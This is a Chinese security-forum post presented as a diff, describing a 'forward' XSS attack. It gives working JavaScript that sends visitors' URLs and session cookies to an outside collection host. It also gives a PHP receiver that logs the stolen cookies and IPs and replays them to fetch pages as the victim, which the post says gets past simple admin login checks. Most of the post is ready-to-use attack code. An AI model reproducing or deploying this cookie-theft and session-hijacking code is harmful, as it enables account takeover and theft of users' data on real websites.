@@ -1,0 +1,97 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+XSS之正向攻击（仅供交流）
+D8888D主贴内容-------------------------------------------------------
+文章作者：TTFCT
+信息来源：邪恶八进制信息安全团队([url=http://www.eviloctal.com]链接标记www.eviloctal.com[/url])
+
+
+XSS正向攻击实现原理：
+访客访问被XSS的页面——》XSS JS将客户端COOKIE+访客浏览器上的URL+访客IP发送到处理端－－》处理端接收到以上信息后，将封包发送到攻击端
+
+示例说明：
+如果[url=http://www.vul.kr/index.php]链接标记http://www.vul.kr/index.php[/url] 源文件中存在JS代码如下：
+//----------------------------XSS页面------------------------
+function getURL(s) {
+var image = new Image();
+image.style.width = 0;
+image.style.height = 0;
+image.src = s;
+}
+getURL("http://www.xx.com/test.php?url="+encodeURIComponent(location.href)+"&cookie="+encodeURIComponent(document.cookie));
+
+当访问者访问 [url=http://www.vul.kr/index.php]链接标记http://www.vul.kr/index.php[/url] 时，以上JS会将访客当前的网址和COOKIE一并发到 [url=http://www.xx.com/test.php]链接标记www.xx.com/test.php[/url]文件进行处理
+
+//--------------------test.php处理端--------------------------
+<?
+error_reporting(0);
+set_time_limit(0);
+
+$url=$_GET['url'];
+$cookie="NULL";
+$addr="NULL";
+$str="";
+$C="";
+if(strlen($_GET['cookie'])>2)$cookie=$_GET['cookie'];
+if(strlen($_SERVER['REMOTE_ADDR'])>2)$addr=$_SERVER['REMOTE_ADDR'];
+
+$url=str_replace(chr(92),chr(47),$url);
+$hv=substr($url,7,strlen($url));
+$dv=strpos($hv,"/");
+$host=substr($hv,0,$dv);
+$myurl=substr($hv,$dv,strlen($url));
+if(strpos($host,":")>0){
+$hostport=explode(":",$host);
+$myhost=$hostport[0];
+$myport=$hostport[1];}
+else {$myhost=$host;$myport=80;}
+
+$str = f_socket($myhost,$myurl,$host,$myport,$cookie);
+$str=$str;
+$str="\r\n\r\nURL:".$url."\r\nCookie:".$cookie."\r\nAddress:".$addr."\r\n\r\n\r\n".$str;
+$C = "<center><textarea name='textarea' cols=150 rows=30>$str</textarea>";
+fwrite(fopen("thisisdata.htm","a+"),$C);
+
+function f_socket($website,$url,$allurl,$port,$ck){
+  $service_port = $port;
+  $address = gethostbyname($website);
+  $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+  if (false == ($socket_result = socket_connect($socket, $address, $service_port)))
+  {exit;}
+
+  $in = "GET " . $url . " HTTP/1.1\r\n";
+  $in .= "Host: " . $allurl . "\r\n";
+  $in .= "Connection: close \r\n";
+  $in .= "Cookie: ".$ck." \r\n\r\n";
+  socket_write($socket, $in, strlen($in));
+
+  $start_time = time();
+  $str = "";
+  do
+  {
+   if (false === ($out = socket_read($socket, 8192))){
+    $str = "";
+    break; }
+   if (time() - $start_time > 1){
+    $str = "";
+    break;}
+   $str .= $out;
+  } while ($out != "");
+
+  socket_close($socket);
+  return htmlentities($str);}
+?>
+
+//---------------------------------处理端完毕--------------------------------
+
+处理端将所得信息组合，通过HTTP封包发送出去，以获取用户当前页面的源代码。因发封了用户的SESSION COOKIE，很多简单的登陆判断都是可以突破的。如：
+<%
+if session("admin")=1 then
+response.write "成功登陆"
+else
+response.end
+end if
+%>
+
+而后台验证比较严格的程序，就不能用这种方法突破了。另一种方法是：分段提交。下次更新请见 [url=http://www.vul.kr]链接标记http://www.vul.kr[/url]。
